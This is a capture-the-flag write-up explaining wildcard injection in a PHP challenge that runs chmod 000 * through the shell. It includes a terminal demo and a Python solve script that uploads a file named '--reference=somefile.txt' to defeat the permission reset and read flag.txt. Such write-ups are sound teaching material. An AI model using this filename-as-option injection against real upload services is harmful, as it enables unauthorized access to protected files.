The PHP code in the challenge runs the following command to make all files unreadable, including the flag.txt file:
```
shell_exec('chmod 000 *');
```

Instead of using PHP’s built-in chmod function, it uses the shell’s chmod command, which make the code vulnerable for wildcard injection. The command does not use `--` to signal the end of options. This means any file starting with `--` will be interpreted as a command-line option for chmod.

Example, if i can upload 2 file: `a.txt` and `--reference=a.txt`, the above command will copy permissions instead of setting them to 000.
```
[$] <> l
total 8.0K
drwxrwxr-x 2 nguyenlong05 nguyenlong05 4.0K Jan 27 21:57 .
drwxrwxr-x 9 nguyenlong05 nguyenlong05 4.0K Jan 27 21:57 ..
---------- 1 nguyenlong05 nguyenlong05    0 Jan 27 21:57 flag.txt
[$] <> touch a.txt            
[$] <> touch '--reference=a.txt'
[$] <> chmod 000 *
chmod: cannot access '000': No such file or directory
[$] <> l
total 8.0K
drwxrwxr-x 2 nguyenlong05 nguyenlong05 4.0K Jan 27 22:00  .
drwxrwxr-x 9 nguyenlong05 nguyenlong05 4.0K Jan 27 21:57  ..
-rw-rw-r-- 1 nguyenlong05 nguyenlong05    0 Jan 27 22:00  a.txt
-rw-rw-r-- 1 nguyenlong05 nguyenlong05    0 Jan 27 21:57  flag.txt
-rw-rw-r-- 1 nguyenlong05 nguyenlong05    0 Jan 27 22:00 '--reference=a.txt'
```
Solve script:
```py
import httpx

url = "https://612fd534-0d54-4bfd-8bc1-deeb5e2a5b1b.x3c.tf:1337/"
resp = httpx.post(url, files={"file": ("--reference=somefile.txt", "")})
resp = httpx.post(url, files={"file": ("somefile.txt", "")})

resp = httpx.get(f"{url}/uploads/flag.txt")
print(resp.text)
```
```
$ python3 solve.py
x3c{4lw4y5_chm0d_y0ur3_f1l35_4_53cur17y}
```